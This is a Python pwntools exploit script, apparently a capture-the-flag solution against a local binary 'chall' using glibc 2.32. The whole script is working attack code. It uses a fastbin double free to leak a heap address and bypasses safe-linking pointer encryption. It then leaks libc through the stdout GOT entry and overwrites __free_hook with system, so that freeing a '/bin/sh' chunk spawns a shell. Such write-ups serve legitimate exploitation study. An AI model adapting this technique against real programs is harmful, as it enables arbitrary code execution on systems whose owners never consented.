#!/usr/bin/python3

from pwn import * 

context.arch="x86_64"
elf = ELF("./chall")

def encrypt_pointer(heap_addr, ptr):
    return ptr ^ (heap_addr >> 12)

def create(index, size, content):

    p.sendlineafter(b">>> ", b"1")
    p.sendlineafter(b"Index: ", str(index).encode())
    p.sendlineafter(b"Size: ", str(size).encode())
    if content:
        p.sendlineafter(b'Content: ', content)
    
def show(index):

    p.sendlineafter(">>> ", "2")
    p.sendlineafter("Index: ", str(index))

def delete(index):

    p.sendlineafter(">>> ", "3")
    p.sendlineafter("Index: ", str(index))

def main():

    global p 

    p = process(elf.path)
    libc = ELF("./libc-2.32.so")
    #============= first step: leak a heap address 
    #fill up tcache 
    for i in range(9):
        create(i, 0xf, b'A')
    
    for i in range(7):
        delete(i)

    delete(7)
    delete(8)
    delete(7)

    show(7)
    heap_leak = p.recvline().rstrip().ljust(8, b'\x00')
    heap_leak = u64(heap_leak)
    log.info(f"Heap leak: {hex(heap_leak)}")
    
    #consume all tcache
    for i in range(7):
        create(i, 0xf, b'A')

    encrypted_got_ptr = encrypt_pointer(heap_leak, elf.got.stdout)
    create(7, 0xf, p64(encrypted_got_ptr))
    create(8, 0xf, b'A')
    create(9, 0xf, b'A')
    create(10, 0, b"")

    show(10)
    libc_leak = p.recvline().rstrip().ljust(8, b'\x00')
    libc_leak = u64(libc_leak)
    log.info(f"Libc leak: {hex(libc_leak)}")
    libc_base = libc_leak - 0x19f6c0
    log.info(f"libc base: {hex(libc_base)}")
    libc.address = libc_base 
    system = libc_base + 0x24ae0
    log.info(f"System at: {hex(system)}")
    free_hook = libc_base + 0x1a1b60
    log.info(f"free hook: {hex(free_hook)}")

    #============= second phase ===============
    #get a shell by overwriting free_hook with system 

    for i in range(9):
        create(i, 0x1F, b'C')

    for i in range(7):
        delete(i)
    
    delete(7)
    delete(8)
    delete(7)
    for i in range(7):
        create(i, 0x1F, b"A")
        
    ptr = encrypt_pointer(heap_leak, free_hook)
    create(7, 0x1F, p64(ptr))
    create(8, 0x1F, b"A")
    create(9, 0x1F, b"/bin/sh\x00")
    create(10, 0x1F, p64(system))

    delete(9)

    p.interactive()

if __name__ == "__main__":

    main()